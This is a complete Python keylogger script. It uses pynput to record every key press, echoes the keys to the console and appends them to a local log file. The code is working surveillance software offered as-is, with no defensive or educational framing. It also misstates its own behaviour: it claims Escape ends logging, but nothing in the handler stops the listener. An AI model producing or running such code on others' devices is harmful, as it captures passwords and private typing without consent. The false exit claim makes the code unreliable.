# Import necessary libraries
import os
import time
from pynput.keyboard import Listener, Key

# Define the log file for storing keystrokes
LOG_FILE = "key_logs.txt"

# Variables to track the last key pressed and the timestamp
last_key = None
last_time = 0.0

# Define debounce threshold to filter out rapid repeated key events (in seconds)
DEBOUNCE_THRESHOLD = 0.2

# Function to handle key press events
def handle_key_press(key):
    """
    Handles key press events and logs them to a file.

    Args:
        key: The key object representing the pressed key.
    """
    global last_key, last_time  # Use global variables to track state
    try:
        # Get the current timestamp
        current_time = time.time()

        # Detect and filter rapid repeated key events
        if key == last_key and (current_time - last_time) < DEBOUNCE_THRESHOLD:
            return  # Skip logging repeated key events

        # Determine the key's string representation
        if hasattr(key, 'char') and key.char is not None:
            key_representation = key.char  # Printable characters
        elif key == Key.space:
            key_representation = " "  # Spacebar
        elif key == Key.enter:
            key_representation = "\n"  # Newline for Enter key
        elif key == Key.backspace:
            key_representation = "<BACKSPACE>"  # Backspace key
        elif key == Key.esc:
            key_representation = "<ESC>"  # Escape key
        else:
            key_representation = f"<{key}>"  # Other special keys

        # Display the key on the console (optional)
        print(key_representation, end='', flush=True)

        # Append the key's representation to the log file
        with open(LOG_FILE, "a") as file:
            file.write(key_representation)

        # Update the last key and timestamp
        last_key = key
        last_time = current_time

    except Exception as error:
        # Print any error that occurs during key logging
        print(f"Error: {error}")

# Function to start the keylogger
def start_logger():
    """
    Starts the keylogger and listens for key press events.
    """
    print("Keylogger running... Press 'Escape' to terminate.")
    # Use the Listener to capture key press events
    with Listener(on_press=handle_key_press) as listener:
        listener.join()

# Entry point of the script
if __name__ == "__main__":
    # Start the keylogger
    start_logger()
